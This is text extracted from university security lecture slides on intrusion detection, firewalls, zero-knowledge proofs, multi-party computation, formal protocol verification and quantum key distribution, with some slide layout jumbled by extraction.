+• Unable to detect unknown attacks
+Examples: Snort, Suricata, Zeek - some of the most popular IDS
+--- Page 7 ---
+An attack is described with a set of goals and transitions that
+must be achieved by an intruder to compromise a system.
+Transitions are represented on state-transition diagrams.
+Inference engine matches current audit records with attacks
+State-transition
+descriptions: event driving, forward chaining
+Analysis
+--- Page 8 ---
+User intention Identification
+This technique models normal behaviour of users by the set of
+high-level tasks they have to perform on the system.
+These tasks are taken as series of actions, which in turn are
+matched to the appropriate audit data.
+If mismatch is encountered, an alarm is produced.
+--- Page 9 ---
+Computer Immunology
+• Analogies with immunology → technique that constructs a model of
+normal behaviour of (UNIX) network services, rather than that of
+individual users.
+• S. Forest et al., Sense of Self for UNIX Processes, 1996
+• This model consists of short sequences of system calls made by the
+processes.
+• The assumption is attacks that exploit flaws in the application code
+are likely to take unusual execution paths.
+• The model consists of two parts:
+audit data representing the appropriate behaviour of services
+knowledge base with all the known “good” sequences of system calls
+--- Page 10 ---
+Computer Immunology
+Stored patterns are used for monitoring of system calls to
+check whether the sequence generated is listed in the
+knowledge base; if not — an alarm is generated.
+Example: pattern of normal behaviour:
+• open, read, mmap, mmap, open, getrlimit, mmap,
+close (system calls in UNIX)
+Information about all sequences of the length, say, 3 may
+be stored in knowledge base
+If the input sequence of calls is
+• open, read, mmap, open, open, getrlimit, mmap, close
+then 4 mismatches will be found
+--- Page 11 ---
+Advantages:
+• Potentially very low false alarm rate (if knowledge base
+complete enough)
+Computer
+• Updating the knowledge base can be done online
+Immunology
+Disadvantages:
+• If an attacker uses legitimate actions to gain
+unauthorized access, no alarm will be generated
+• Arguments of system calls are not taken into account
+--- Page 12 ---
+Data mining
+• Set of techniques that use the process of extracting
+previously unknown information from large stores of data.
+• Data mining techniques are suitable for large volumes of
+audit data (off-line processing).
+• DM is less useful for stream analysis of network traffic.
+• Based on analysis of co-occurrences and correlations of
+event records, DM may produce
+• Decision trees
+• Association rules
+as a concise representations of discovered relationships
+--- Page 13 ---
+Data mining
+• Example of the rule, generated by DM:
+• if for the past 2 seconds, the count of connections to the
+same host is greater than 4; and the the percentage of
+those that have the same service is greater than 75%; and
+the percentage of those that have the “S0” flag is greater
+than 75%, then there is a syn flood attack.
+(taken from Real Time Data Mining-based Intrusion
+Detection, Wenke Lee et al.)
+
+================================================================================
+LECTURE: COMP232-15-Firewalls-26
+================================================================================
+
+--- Page 2 ---
+As we have already discussed, many serious security
+threats come from the networks Security
+threats and
+The firewalls implement hardware or software solutions network
+based on the control of network connections between
+local network and other networks
+--- Page 3 ---
+Hardware
+firewall
+--- Page 4 ---
+Software
+firewall
+--- Page 5 ---
+Layer Architecture in the OSI model
+Source: Wikipedia
+--- Page 6 ---
+Firewalls work at these layers
+Layers in
+network
+connections
+(OSI model)
+--- Page 7 ---
+Messages in
+OSI model
+--- Page 8 ---
+All traffic from inside to outside, and vice versa, must
+pass through the firewall. All access to the local
+network is blocked except via firewall.
+Firewall
+characteristics
+Only authorized traffic, defined by the local security
+policy is allowed to pass in either direction.
+--- Page 9 ---
+Service control: determines what types of services
+can be accessed
+Direction control: determines in which direction
+Types of
+particular service request may be initiated
+control used
+by firewalls
+User control: determines access to a service
+according to a user
+Behaviour control: controls how particular
+services are used.
+--- Page 10 ---
+Cannot protect against attacks that bypass
+the firewall.
+Limitations of
+Does not protect against internal threats.
+the firewalls
+Cannot protect, in general, against transfer
+of virus-infected programs or files.
+--- Page 11 ---
+Packet filtering router
+(works at the network layer, IP)
+Types of
+Circuit-level gateway
+firewalls
+(works at the transport layer, TCP)
+Application-level gateway
+(works at higher layers)
+--- Page 12 ---
+Packet-
+filtering router
+➢ A packet-filtering router applies a set of rules to each incoming
+IP packet and then forwards or discards the packet.
+➢ Filtering is based on information contained in a network packet
+--- Page 13 ---
+Filtering rules
+Filtering rules are based on:
+Source IP address
+Destination IP address
+Source and Destination transport-level address: transport level port number
+IP protocol field: defines the transport protocol
+--- Page 14 ---
+One may apply rules following two different default policies:
+• Discard: that which is not explicitly permitted is prohibited
+Default
+ More conservative. At the beginning everything is forbidden.
+Then permitting rules must be added on a case-by-case basis.
+policies
+• Forward: that which is not explicitly prohibited is permitted
+ More convenient to use, but less secure. Once security threat
+is recognized, specific forbidding rule(s) must be added
+--- Page 15 ---
+Packet-filtering
+examples
+(Default=discard)
+--- Page 16 ---
+Simple
+Pros: Transparent for users
+Very fast
+Pros and cons
+of packet
+filtering
+Lack of upper-layer functionality
+Do not support advanced user authentication schemes
+Cons:
+Cannot block specific application commands: either the
+application is disallowed, or all its functions are permitted
+--- Page 17 ---
+Circuit-level
+gateway
+--- Page 18 ---
+• Traffic is filtered based on specified session rules, like:
+ a session is initiated by a recognized computer
+• A circuit-level gateway sets up two connections: Circuit-level
+ one between itself and a TCP user on the inner host
+gateways
+ one between itself and a TCP user on the outer host
+• Once connections are established and security criteria
+are met, both connections are linked by the gateway
+--- Page 19 ---
+Pros:
+Circuit-level gateways are relatively inexpensive
+Pros and cons
+Have the advantage of hiding information about the private of circuit-level
+network they protect.
+gateways
+Cons:
+Do not filter individual packets
+--- Page 20 ---
+Application-
+level gateway
+--- Page 21 ---
+• They can filter packets at the application layer of
+the OSI model.
+• Incoming or outgoing packets cannot access
+Application
+services for which there is no proxy:
+layer gateways
+for example, an application-level gateway that is
+configured to be a web proxy will not allow any ftp,
+(proxies)
+telnet or other traffic through.
+• They can filter application specific commands
+such as http:post and get, etc.
+--- Page 22 ---
+• They offer a high level of security
+• Application specific protection
+Pros:
+Pros and Cons
+of Application-
+Level
+• Significant impact on network performance
+• Are not transparent to end users, and
+Gateways
+• Require manual configuration of each client
+Cons
+computer
+--- Page 23 ---
+Benefits:
+• Firewalls protect private local area networks from
+hostile intrusion from the Internet
+Firewalls:
+• Flexibility in implementation of security policies
+benefits and • Relatively inexpensive solution
+problems
+Possible problems:
+• Possible traffic bottleneck
+• Security concentrated in one spot
+--- Page 24 ---
+Palo-Alto Networks Firewall Overview:
+Key next-
+ Identify applications, not ports generation
+ Identify users, not just IP addresses
+firewall
+ Inspect content in real-time (deep packet analysis)
+requirements
+ Simplify policy management
+ Deliver multi-gigabit throughput
+
+================================================================================
+LECTURE: COMP232-16-ZKP-MPC-26
+================================================================================
+
+--- Page 1 ---
+Advanced Crypto:
+Zero-knowledge proofs and
+Secure Multi Party computations
+--- Page 2 ---
+Zero-knowledge proofs
+Further
+Advanced
+Crypto
+techniques
+Secure Multi-Party Computations
+--- Page 3 ---
+ Can we convince somebody that we know something
+(solution to the problem, a secret password, etc) without
+actually revealing it? Zero-
+ Yes, we can! (starting from Goldwasser, Micali, Rackoff, 1980s)
+Knowledge
+Proofs
+Interactive zero-knowledge proof of 3-colorability
+http://web.mit.edu/~ezyang/Public/graph/svg.html
+--- Page 4 ---
+ZKP Examples
+Where’s Waldo?
+--- Page 5 ---
+• Assume Bob is red-green colour-blind.
+• Bob cannot tell that the red card and the green card he has
+in his hand are differently colored.
+• Alice wants to prove to him that she can tell the difference
+ZKP Examples
+between red and green.
+Colour-blind Bob
+Here is a simple protocol:
+• Bob hides both the red and green cards behind his back.
+• He shuffles them and pulls out one to show to Alice.
+• Alice correctly tells Bob if the card is green or red.
+--- Page 6 ---
+Two graphs 𝐺 , 𝐺 are said to be isomorphic if the vertices of 𝐺
+1 2 1
+can be relabelled to get 𝐺
+2
+Example:
+Graph
+Isomorphism
+Image courtesy: https://www.javatpoint.com/graph-isomorphism-in-discrete-mathematics
+--- Page 7 ---
+Example:
+a g
+1 2
+b h 5 6
+Graph
+Isomorphism
+c i 8 7
+d j 4 3
+The Graph Isomorphism problem:
+Given two graphs 𝐺 , 𝐺 , decide if they are isomorphic.
+1 2
+--- Page 8 ---
+A zero-knowledge proof for graph non-isomorphism is
+identical to the red-ball green-ball example.
+• Bob has two graphs 𝐺 , 𝐺 that are allegedly not isomorphic.
+1 2
+ZKP: Graph • Bob picks either 𝐺 or 𝐺 at random and randomly
+1 2
+relabels the vertices to get the graph 𝐻.
+non-isomorphism
+• Now Bob asks Alice if the graph 𝐻 originated from 𝐺 or from 𝐺 .
+1 2
+• If Alice can correctly tell each time which graph was used
+originally, then it is very likely that 𝐺 and 𝐺 are not isomorphic!
+1 2
+--- Page 9 ---
+Zero-knowledge proof for 3-colorabiity
+Problem:
+ How to colour vertices of a graph with no
+neighbouring vertices having the same colour?
+ In general, it is a difficult NP-hard problem.
+ For a given graph, can the Prover (Peggy) convince
+the Verifier (Victor) she knows a 3-coloring of the
+graph without revealing any information?
+--- Page 10 ---
+Yes! In short:
+1. Peggy hides her solution and allows Victor to open
+the colours of any pair of vertices
+Zero-
+2. Then, Peggy reshuffles actual colours preserving 3-
+colorability, hides modified solution, and allows Victor
+knowledge
+to open the colours of any pair of vertices again
+proof for 3-
+3. Repeat step 2 until Victor convinced.
+colorabiity
+See detailed popular explanation at
+https://blog.cryptographyengineering.com/2014/11/27/zer
+o-knowledge-proofs-illustrated-primer
+--- Page 11 ---
+Prover needs to convince verifier that he has a solution
+Requirements for ZKP
+▪ Completeness: Prover should be able to convince Verifier that he has
+true solution (with high-probability)
+▪ Soundness: It should be able to convince Verifier only in true solutions
+▪ Zero-knowledge(ness): Verifier should not be able to learn anything,
+but the fact Prover has a solution
+Applications:
+ Zero-knowledge authentication
+ZKP: Prover
+ zero-knowledge information exchange contracts
+ verifiable computing, etc vs Verifier
+--- Page 12 ---
+zk-SNARK:
+Zero-Knowledge Succinct Non-Interactive Argument of Knowledge
+ Prover sends a short message (evidence) to a Verifier to prove
+that he knows something (without revealing any additional
+information
+ For example: prover may convince verifier that he has an input
+(message, number) which produces a given hash!
+Zero-
+ Question: can you think about an application of such a technique?
+Knowledge:
+interactive vs
+non-interactive
+--- Page 13 ---
+zk-SNARK
+ Small proofs and cheap verification
+ But expensive prover computations (both time & space)
+ Statement to be proved (F(x,w)=true) has to be presented by a circuit:
+ 10-20 millions gates max (2017) and to produce a proof it takes 1ms per gate
+--- Page 14 ---
+DIZK: A Distributed Zero Knowledge Proof System
+(H. Wu et al, UC Berkley, 2018)
+Distributes proofs computations across a computer cluster
+(Java & Apache Spark)
+DIZK
+Can generate proofs for the statements up to billions of circuits
+taking 0.01ms per gate.
+Available at hhttpts:/t/gpithusb.:co/m//gscipir-tlabh/duizkb.com/scipr-lab/dizk
+Examples of applications:
+authenticity of edited photo, integrity of machine learning models
+--- Page 15 ---
+Secure Multi Party Computations
+Several parties would like to compute something useful with their secret information
+but would not like to share information.
+ Yao millionaire problem (1982): Alice and Bob would like to know who is richer
+without revealing their actual wealth.
+Introductory explanation of a solution of a bit simpler problem
+ Candy problem: Alice and Bob would like to know whether they have the same
+number of chocolates without revealing to each other how many they have.
+is at: https://hackernoon.com/eli5-zero-knowledge-proof-78a276db9eff
+--- Page 16 ---
+Yao, 1982: the idea of MPC, in following
+speed of SMPC increased
+few years the first Garbled Circuits
+in 5 orders of magnitude
+Protocol for generic MPC was introduced
+2004
+Short History
+1982 2004-now
+of Secure MPC
+Malkhi et al, 2004: Fairplay
+implementation of generic SMPC
+(median of two sorted arrays of ten
+integers in 7s)
+(D Evans et al, A Pragmatic Introduction to Secure Multi-Party Computation, 2018)
+--- Page 17 ---
+ Danish sugar beets auction (2009)
+Applications of
+ Estonian Student Study (2015)
+SMPC
+ Boston Wage Equity study (2017) ...
+Secure Auctions, Voting, Secure Machine Learning,
+Privacy-Preserving Genomics, etc.
+--- Page 18 ---
+We would like to compute 𝐹(𝑥, 𝑦) where 𝑃 holds 𝑥 ∈ 𝑋 and
+1
+𝑃 holds 𝑦 ∈ 𝑌 as their private values
+2
+How does it
+𝑃 calculates and tabulates all values of 𝐹 𝑥, 𝑦 , 𝑥 ∈ 𝑋
+1
+work?
+and 𝑦 ∈ 𝑌 in the table 𝑇 = (𝑇 )
+𝑥,𝑦
+Simplified
+Yao’s Protocol
+𝑃 encrypts each 𝑇 with two random keys 𝑘 and 𝑘 ,
+1 𝑥,𝑦 𝑥 𝑦
+randomly permutes the table 𝑇 and sends it to 𝑃
+2
+Now, in order for 𝑃 to compute 𝐹(𝑥, 𝑦), 𝑃 sends 𝑘 and
+2 1 𝑥
+𝑘 to 𝑃 , who after that can complete computation
+𝑦 2
+--- Page 19 ---
+How does it work? Simplified Yao’s Protocol
+ Question: How does 𝑃 know which 𝑘 to send to 𝑃 ? 𝑃 knows 𝑥, but not 𝑦!
+1 𝑦 2 1
+ Answer: It is done using oblivious transfer!
+--- Page 20 ---
+ Given: Sender S has input secrets 𝑥 and 𝑥 (binary
+0 1
+strings) and Receiver R has a selection bit 𝑏 ∈ {0,1}
+ After executing OT: Receiver gets 𝑥 and Sender
+𝑏
+Oblivious does not learn anything about 𝑏
+Transfer (OT)
+ Can be implemented using public-key encryption
+(can you propose how to do it?)
+ The above version is 1-out-of-2 OT, for simplified
+Yao’s protocol we need 1-out-of-Y OT, which can be
+implemented similarly.
+--- Page 21 ---
+ JIFF library developed in Boston University (multiparty.org)
+ JIFF is a JavaScript library for building applications that rely on
+secure multi-party computation. JIFF is built to be highly
+From Theory
+flexible with a focus on usability, with the ability to be run in
+the browser, on mobile phones, or via Node.js. JIFF is designed
+to Applications
+so that developers need not be familiar with MPC techniques
+or know the details of cryptographic protocols in order to build
+secure applications.
+(from https://github.com/multiparty/jiff)
+--- Page 22 ---
+All these technologies:
+ Fully Homomorphic Encryption (FHE)
+Advanced
+ Zero-knowledge proofs (ZKP)
+ Secure Multi-Party Computations (SMPC)
+Crypto to
+ Functional Encryption
+Applications
+ Private Information Retrieval
+ Differential Privacy
+ Post-Quantum Cryptography
+are at the beginning of exciting applications.
+
+================================================================================
+LECTURE: COMP232-17-18-Protocols-26
+================================================================================
+
+--- Page 2 ---
+SECURITY PROTOCOLS
+A security protocol is a set of rules, followed by the communication
+parties during message exchange.
+Its purpose is to achieve security goals such as:
+ Authentication
+ Key establishment
+ Confidentiality
+ Integrity
+Example: the Diffie-Hellman protocol establishes a shared secret key
+--- Page 3 ---
+EXAMPLE: NEEDHAM-SCHROEDER
+PROTOCOL
+The goal of the protocol is to establish mutual authentication between two
+parties A and B in the presence of adversary, who can
+ Intercept messages
+ Delay messages
+ Read and copy messages
+ Generate messages
+But who does not know
+ secret keys of parties, which they share with the authentication server S
+• A and B obtain a secret shared key though authentication server S
+• The protocol uses shared keys encryption/decryption
+--- Page 4 ---
+NEEDHAM-SCHROEDER PROTOCOL
+S
+1. 𝐴, 𝐵, 𝑁
+𝐴
+2. 𝑁 , 𝐵, 𝐾 , 𝐾 , 𝐴
+𝐴 𝐴𝐵 𝐴𝐵 𝐾
+𝐵 𝐾
+𝐴
+3. 𝐾 , 𝐴
+𝐴𝐵 𝐾
+𝐵
+A 4. 𝑁 B
+𝐵 𝐾
+𝐴𝐵
+5. 𝑁 − 1
+𝐵 𝐾
+𝐴𝐵
+FIG: NEEDHAM-SCHROEDER PROTOCOL WITH SHARED KEYS
+--- Page 5 ---
+• Message 1 A ↦ S: A, B, N
+NEEDHAM-
+A
+• Message 2 S ↦ A: N , B, K , K , A
+A AB AB K
+SCHROEDER B K
+A
+• Message 3 A ↦ B: K , A
+AB K
+B
+PROTOCOL
+• Message 4 B ↦ A: N
+B K
+AB
+• Message 5 A ↦ B: N − 1
+B K
+AB
+ Here K and K are keys of A and B shared with S, resp.
+A B
+ N and N are nonces, introduced by A and B, resp.
+A B
+ K is a secret session key for A and B provided by S
+AB
+--- Page 6 ---
+HOW IT WORKS
+• A contacts the authentication server S, sending identities A and B and
+nonce 𝑁
+𝐴
+• S responds with a message encrypted with the key of A
+The message contains session key 𝑲 (to be used by A and B) and
+𝑨𝑩
+certificate encrypted with B’s key conveying the session key and A’s identity
+• A sends the certificate to B
+• B decrypts the certificates and sends his own nonce encrypted by the
+session key to A (nonce handshake)
+• A decrypts the last message and sends modified nonce back to B
+By the end of the message exchange both A and B share the secret key
+and both are assured in the presence of each other
+--- Page 7 ---
+CORRECTNESS OF PROTOCOLS
+• Are they correct at all?
+• A protocol may look correct, but still contain subtle flaws
+• We have used semi-formal arguments, like
+If a message is encrypted with the public key of Alice, then only a participant
+who knows private key of Alice (presumably Alice herself only) can decrypt it.
+• Typically, we have considered possible attacks and argued using the
+reasoning as above, that attacks are impossible (under some reasonable
+assumptions).
+• Is that enough? Are we sure that we have considered all possible
+situations of use?
+• Formal analysis helps us check all possible behaviours more systematically
+--- Page 8 ---
+HOW TO ANALYSE A SECURITY PROTOCOL
+What is each message carrying? (e.g. key, nonce, identity, encrypted data)
+What does the receiver learn? (can they verify sender or just read data?)
+What is the goal? (authentication, key exchange, confidentiality)
+Can an attacker interfere? (intercept, replay, modify, impersonate)
+Does encryption alone guarantee security? (check identity, freshness, session binding)
+Key idea: A protocol may look secure step-by-step but fail when an attacker interacts with it.
+--- Page 9 ---
+TYPICAL ATTACKS TO LOOK FOR
+Man-in-the-Middle (MITM): Impersonation: attacker
+Replay attack: reuse of old
+attacker relays messages pretends to be another
+messages (no freshness)
+between parties party
+Parallel session / reflection:
+Message substitution:
+reuse messages across
+attacker modifies messages
+sessions
+Warning: Encryption alone is not enough — ensure identity, freshness, and correct session binding.
+--- Page 10 ---
+CORRECTNESS OF PROTOCOLS. II
+Security protocols are designed to succeed even in the presence of malicious agents, often called intruder (adversary)
+Intruder may have complete or partial control over the communication network and may have different
+computational capabilities
+The correctness of the protocols depends on the assumptions on capabilities of possible intruder
+Assumptions are often left implicit
+Typically, in security we have to deal with numerous non-trivial assumptions
+--- Page 11 ---
+THE POWER OF FORMAL METHODS
+What should we do about establishing correctness of security protocols?
+Apply formal methods!
+• Make explicit all the assumptions involved in a protocol
+• Make a formal model of the protocol (and its execution)
+• Apply formal reasoning, which would establish the correctness of the protocol
+Two important aspects:
+• The correctness is established only for a particular formal model of the protocol
+• and under explicit assumptions (about capabilities of participants, etc)
+--- Page 12 ---
+LOGICAL REPRESENTATION
+Formal aspects of reasoning is an important part of logic
+Logical representation and analysis of the security protocols is a particular successful
+approach for the protocol's verification
+Non-classical modal epistemic logics dealing with such notions as “belief” and “knowledge”,
+are more suitable here than classical logics dealing primarily with “truth”
+--- Page 13 ---
+AUTOMATED VERIFICATION / ANALYSIS
+• It is not easy and is error-prone to do formal analysis manually
+• Development of methods for automated or semi-automated
+(interactive) validation and verification is important area,
+especially in the context of security protocols
+--- Page 14 ---
+DIFFERENT DIRECTIONS
+Model checking (try all possible executions)
+ specific (NRL Protocol Analyser, etc)
+ general purpose tools (SMV, SPIN, etc)
+ general purpose tools combined with specific translators (Casper, etc)
+ Unbounded model checking for crypto protocols (ProVerif, etc)
+Theorem proving (prove no attack exists mathematically)
+ Automated (TAPS, etc)
+ Interactive (Isabell, PVS, etc )
+Combinations of above techniques:
+ Athena, etc
+Others: decision procedures for specific theories, infinite state model checking, etc
+--- Page 15 ---
+GENERAL QUESTIONS
+How to represent a protocol How to express properties to be
+(system) to be analysed? verified?
+--- Page 16 ---
+MODEL CHECKING
+A protocol (system executing a protocol) is represented as a
+transition system M with finitely many states
+A property to be analysed is expressed by a formula of a logic
+(temporal, modal, etc) f
+Then verification amounts to checking whether the formula f is
+true in M
+Model checking is done via efficient state exploration techniques
+--- Page 17 ---
+MODEL CHECKING
+True or
+Finite State System Model
+False with
+checker
+Property 𝜙
+counter-example
+Nice properties
+• Fully automated procedures
+• Very efficient state exploration
+but
+• Finite state abstraction is not always adequate, especially for protocols with
+unbounded number of participants or unbounded number of rounds.
+--- Page 18 ---
+A particular success of model checking methods
+ATTACK ON
+in security protocol verification was discovery of
+a flaw in NS protocol based on public key
+NEEDHAM-
+cryptography (Gavin Lowe, 1995-1996)
+SCHROEDER
+PROTOCOL
+Original protocol
+Message 1: 𝐴 → 𝐵: 𝐴, 𝐵, 𝐴, 𝑁
+𝐴 𝑃𝐾(𝐵)
+Message 2: 𝐵 → 𝐴: 𝐵, 𝐴, 𝑁 , 𝑁
+𝐴 𝐵 𝑃𝐾(𝐴)
+Message 3: 𝐴 → 𝐵: 𝐴, 𝐵, 𝑁
+𝐵 𝑃𝐾(𝐵)
+--- Page 19 ---
+ATTACK ON NEEDHAM-SCHROEDER PROTOCOL
+Attack
+Original protocol Message 1𝑎: 𝐴 → 𝐼: 𝐴, 𝐼, 𝐴, 𝑁
+𝐴 𝑃𝐾(𝐼)
+Message 1𝑏: 𝐼 → 𝐵: 𝐴, 𝐵, 𝐴, 𝑁
+𝐴 𝐴 𝑃𝐾(𝐵)
+Message 1: 𝐴 → 𝐵: 𝐴, 𝐵, 𝐴, 𝑁
+𝐴 𝑃𝐾(𝐵) Message 2𝑏: 𝐵 → 𝐼 : 𝐵, 𝐴, 𝑁 , 𝑁
+𝐴 𝐴 𝐵 𝑃𝐾(𝐴)
+Message 2: 𝐵 → 𝐴: 𝐵, 𝐴, 𝑁 , 𝑁
+𝐴 𝐵 𝑃𝐾(𝐴) Message 2𝑎: 𝐼 → 𝐴: 𝐼, 𝐴, 𝑁 , 𝑁
+𝐴 𝐵 𝑃𝐾(𝐴)
+Message 3: 𝐴 → 𝐵: 𝐴, 𝐵, 𝑁
+𝐵 𝑃𝐾(𝐵) Message 3𝑎: 𝐴 → 𝐼: 𝐴, 𝐼, 𝑁
+𝐵 𝑃𝐾(𝐼)
+Message 3𝑏: 𝐼 → 𝐵: 𝐴, 𝐵, 𝑁
+𝐴 𝐵 𝑃𝐾(𝐵)
+Corrupt participant I impersonates A
+--- Page 20 ---
+THEOREM PROVING
+• A protocol (a system) to be verified is described by a formula Fs of a
+logic (classical first-order, higher-order, modal, temporal, etc)
+• A property to be verified is expressed by a formula P of the same logic
+• Then to establish the required property it is enough to prove the
+theorem Fs → P
+--- Page 21 ---
+THEOREM PROVING
+ Potential benefits:
+• the systems with unbounded (infinite) number states can be
+analysed
+• E.g., “∀x (S(x) & B(x,m) → R(x))” may encode “any participant
+in a state S changes its state to R after sending message m”
+ But:
+• The problems here are, in general, undecidable
+• Procedures are incomplete and of high complexity
+--- Page 22 ---
+THEOREM PROVING
+ What to do?
+• Apply automated procedures for fragments of first-order
+and higher-order logic
+ E. Cohen, TAPS system, Microsoft Research
+• Use interactive theorem proving
+ L. Paulson, Cambridge: using Isabell, higher-order inductive
+theorem prover for the verification of security protocols
+ J. Bryans, S. Schenider, using interactive theorem prover PVS
+--- Page 23 ---
+SPECIALIZED APPROACHES
+Bruno Blanchet, INRIA: approach based on ideas from Logic Programming
+(ProVerif, available online at https://bblanche.gitlabpages.inria.fr/proverif/)
+ A protocol is presented as a set of Horn clauses (like a program in Prolog), defining capabilities of all participants
+ Verification then amounts to checking whether a security breaching goal can be derived from the set of clauses
+ If the system detects the goal is unreachable, then the protocol is correct
+ Standard operational semantics of Prolog is not very useful here due to undesirable looping
+ Novel operational semantics (search strategy) is defined
+ Recent versions use pi-calculus as a language for front-end
+--- Page 24 ---
+PROVERIF SYSTEM
+Its representation in ProVerif system (old syntax)
+Denning - Sacco key
+distribution protocol
+Computation abilities of the attacker
+pencrypt: attacker(m) ∧ attacker(pk) → attacker(pencrypt(m, pk))
+pk: attacker(sk) → attacker(pk(sk))
+pdecrypt: attacker(pencrypt(m, pk(sk))) ∧ attacker(sk) → attacker(m)
+Message 1: 𝐴 → 𝐵: {{𝑘} }
+𝑠𝑘 𝑝𝑘
+𝐴 𝐵 sign: attacker(m) ∧ attacker(sk) → attacker(sign(m, sk))
+Message 2:𝐵 → 𝐴: {𝑠}
+𝑘 getmess: attacker(sign(m, sk)) → attacker(m)
+checksign: removed since implied by getmess
+sencrypt: attacker(m) ∧ attacker(k) → attacker(sencrypt(m, k))
+Explanation: sdecrypt: attacker(sencrypt(m, k)) ∧ attacker(k) → attacker(m)
+A generates session key 𝑘
+Initial knowledge of the attacker
+A signs 𝑘 with A’s secret key
+attacker(pk(sk_A)) attacker(pk(sk_B)) attacker(a[])
+A encrypts the signed key with B’s public key
+B replies using 𝑘
+Protocol
+First message: attacker(pk(r)) → attacker(pencrypt(sign(k, sk_A[]), pk(r)))
+Second message: attacker(pencrypt(sign(k, sk_A[]), pk(sk_B[]))) → attacker(sencrypt(s[], k))
+--- Page 25 ---
+• Protocols may look correct step by step yet still fail in the
+presence of an attacker.
+• Encryption alone is not enough: protocols also need
+authentication, freshness, and correct session binding.
+• Typical flaws include replay, impersonation, and man-in-the-
+middle attacks.
+KEY
+TAKE-AWAYS • Formal methods help us analyse protocols systematically, using
+model checking, theorem proving, and tools such as ProVerif.
+A protocol is secure only if it remains secure even when an
+attacker can observe and interfere with the communication.
+This is why protocol analysis matters.
+
+================================================================================
+LECTURE: COMP232-19-20-Quantum-26
+================================================================================
+
+--- Page 1 ---
+Quantum Cryptography & Quantum Computing
+--- Page 2 ---
+Plan
+FOR THOUSANDS OF YEARS, CODE-MAKERS AND CODE-BREAKERS HAVE
+BEEN COMPETING FOR SUPREMACY. THEIR ARSENALS MAY SOON INCLUDE
+A POWERFUL NEW WEAPON: QUANTUM MECHANICS.
+DANIEL GOTTESMAN AND HOI-KWONG LO (2001)
+ QUANTUM CRYPTOGRAPHY
+ QUANTUM COMPUTING AND CRYPTANALYSIS
+--- Page 3 ---
+Waves or particles?
+Paintballs Light
+--- Page 4 ---
+Waves or particles?
+Electrons Quantum Mechanics:
+• Particles may be in a “superposition” of several
+states at the same time
+• Electron may be in a combination of state “at 1”
+and “at 2”
+• When measured we always get a definite state
+--- Page 5 ---
+QM principles
+A particle can be in a superposition of several states at the same time
+Particle characteristics are best described as superpositions of base values
+When characteristics are measured, the superposition collapses into a single state,
+losing any information about the state before measurement. (special importance
+for quantum cryptography: you cannot measure the system without disturbing it)
+--- Page 6 ---
+Qubit (quantum bit) is a quantum system with two
+•
+discrete states, usually denoted by |0⟩ and |1⟩
+A state of qubit is an arbitrary superposition of
+•
+basis states, i.e., a linear combination 𝑎|0⟩ + 𝑏|1⟩,
+Qubits
+where a, b are complex numbers, called amplitudes
+The norm squared of the amplitude of a state is the
+•
+probabilities of measuring the system in that state:
+2 2
+𝑎 for |0⟩ and 𝑏 for |1⟩
+--- Page 7 ---
+Example
+If electron has equal probabilities to
+go through either 𝐻1 or 𝐻2 then its
+position might be superposition of
+1 1
+two states: |𝐻1⟩ + |𝐻2⟩
+2 2
+--- Page 8 ---
+Example (cont.)
+If one tries to measure the position of
+electron either at 1 or at 2 then
+probability of finding electron there
+would be ½ . At the same time
+measurements destroy superposition
+of states, and one gets the following
+distribution.
+--- Page 9 ---
+Measurements
+Measuring of any quantum system (e.g. qubit) projects the state vector of the system onto a new state vector.
+The measurements in a set, called “basis”, are a description of what can be observed. In our example the basis
+is states H1 and H2.
+In short, any measurement is defined by a basis. The result of the measurement is a (state) vector of the basis.
+The probability to get such a result is defined by amplitude assigned to a particular basis state vector.
+Often quantum systems can be described with many different, but related, bases.
+--- Page 10 ---
+ Charles H. Bennett and Gilles Brassard, 1984 (BB84)
+(awarded the prestigious Turing award last month)
+ QKD protocol ensures:
+• that either the distributed key will be perfectly secure,
+Quantum Key
+• or that parties will learn that someone is listening and
+therefore, not use the key.
+Distribution
+ In this protocol, we use polarization of photons:
+• We consider two different bases:
+ → and ↑ denoted by +
+ and denoted by ×
+--- Page 11 ---
+BB84 protocol: Two Channels
+• Alice and Bob use two
+channels, quantum and
+classical
+• Both channels may be
+overheard by Eve the
+adversary
+--- Page 12 ---
+BB84 protocol in action
+--- Page 13 ---
+Polarization Bases in BB84
+A qubit can be prepared and measured in different bases; the chosen basis determines what outcomes can be observed.
+--- Page 14 ---
+Photon measurement with different bases
+Key idea: Correct basis → deterministic result, Wrong basis → random result
+Also, Alice and Bob agree in advance on how to represent 0 and 1 using polarization in two different bases, e. g.,
+→ and represent 0 and ↑ and represent 1
+--- Page 15 ---
+Protocol description
+• Alice sends to Bob a stream of polarized photons, choosing randomly among the four polarization states
+↑ , → , , and (Quantum channel)
+• When receiving, Bob chooses randomly between + and × bases and measures the photon in that basis.
+• After the transmission is complete, Bob sends Alice the sequence of bases he used for the
+measurements. (Public channel).
+• Alice tells Bob which positions used the same basis as hers. (Public channel)
+• Alice and Bob discard all positions where their bases were different.
+• Of the remaining positions, Bob’s measurement outcomes (in the ideal case) match Alice’s encoded bits,
+and these form the raw shared key. On average, about 50% of the positions are retained.
+--- Page 16 ---
+BB84 protocol: security over public channel
+When Eve is listening only public channel, she cannot learn anything about the key itself (because for a given
+basis Alice sends random polarizations)
+--- Page 17 ---
+BB84 protocol: security over quantum channel
+❑ What if Eve tries to eavesdrop on the quantum channel?
+ She has to guess correct basis at
+each step (50% on average) to
+make measurements.
+ But when Eve measures a photon,
+its state is altered to conform to
+the basis Eve used, so Bob will get
+the wrong result in approximately
+half of the cases where he and
+Alice have chosen the same basis.
+--- Page 18 ---
+ Next, Alice and Bob publicly compare small parts of their
+raw keys to estimate the error rate, then delete these
+publicly disclosed bits from their key, leaving the
+Key
+tentative final key.
+establishment
+ If the error rate exceeds a pre-determined error
+threshold, indicating possible interception by Eve, they
+start over from the beginning to attempt a new key.
+--- Page 19 ---
+Practical Implementations
+ Los-Alamos Laboratory:
+• implementation of the protocol with quantum channel, distance = 184.6 km (fibre optic) (2006)
+• quantum channel through the air, distance > 10 km
+ University of Munich: quantum key exchange with the airplane (>20km, 300km/h) (2012)
+ Italian Space Agency & Padova Uni & Chinese space agency: Quantum communication with a
+satellite, distance > 1000 km (2015)
+ Commercial implementations: ID Quantique …
+ Quantum RNG: ID Quantique …
+--- Page 20 ---
+Quantum Random Number Generation (QRNG)
+➢ Quantum RNGs (QRNGs) use quantum mechanics to produce truly random numbers
+➢ QRNGs leverage quantum superposition and measurement unpredictability
+Random Number Generation Process
+➢ A quantum system (often single-photon source) prepares quantum states (e.g., entangled states)
+➢ A quantum measurement (e.g., polarization) collapses the state randomly due to quantum uncertainty
